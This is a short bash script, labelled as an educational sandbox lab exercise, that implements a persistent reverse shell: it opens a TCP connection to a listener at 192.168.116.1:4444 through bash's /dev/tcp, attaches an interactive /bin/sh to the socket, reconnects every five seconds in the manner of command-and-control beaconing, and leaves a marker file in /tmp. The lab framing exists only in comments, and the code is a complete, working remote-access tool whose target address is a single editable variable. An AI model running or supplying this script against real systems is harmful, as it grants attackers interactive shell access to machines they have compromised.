#!/bin/bash
# ==============================================================
# lab_reverse.sh — EDUCATIONAL reverse shell (isolated sandbox lab)
#
# Purpose : Capstone exercise — demonstrate how a reverse shell
#           behaves inside a snapshotted, network-isolated VM.
# Endpoint: The "analyst" host over VMware host-only VMnet1
#           (192.168.116.1). The VM has NO route to the internet.
# \brief  Reconnects every 5 seconds until killed, then leaves a
#           /tmp/c2_beacon.txt marker so we can observe persistence.
# ==============================================================

HOST=192.168.116.1
PORT=4444

echo "beacon started $(date -u)" > /tmp/c2_beacon.txt

while true; do
    # bash /dev/tcp: open a TCP connection and attach an interactive
    # /bin/sh to it (stdin/stdout/stderr all go over the socket).
    bash -c "exec 3<>/dev/tcp/$HOST/$PORT; exec /bin/sh -i <&3 >&3 2>&3" 2>/dev/null
    # Connection ended (listener closed) — sleep and retry like real C2.
    sleep 5
done
